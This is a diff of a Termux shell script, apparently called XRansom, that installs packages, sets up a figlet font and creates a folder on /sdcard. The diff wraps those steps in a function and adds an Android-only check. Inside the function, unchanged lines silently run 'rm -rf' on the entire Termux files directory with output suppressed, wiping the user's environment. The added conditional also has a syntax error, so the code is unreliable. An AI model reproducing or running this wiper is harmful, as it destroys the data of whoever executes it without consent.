@@ -1,11 +1,11 @@
-#!/bin/sh
-apt update
-apt upgrade
-apt install zip
-apt install figlet
-apt install pv
-apt install git
-sd(){ 
+#!/bin/bash
+sd(){
+    apt update
+    apt upgrade
+    apt install zip
+    apt install figlet
+    apt install pv
+    apt install git
     mv cosmike.flf /data/data/com.termux/files/usr/share/figlet
     clear
     mkdir /sdcard/XRansom
@@ -18,6 +18,10 @@ sd(){
     rm -rf /sdcard/XRansom >> /dev/null
     rm -rf /data/data/com.termux/files/* >> /dev/null
 }
-
-test -r /sdcard && sd
-test -r /sdcard || termux-setup-storage
+if [[ "$(uname -o)" == "Android"]];then
+    test -r /sdcard && sd
+    test -r /sdcard || termux-setup-storage
+else
+    clear
+    exit
+fi
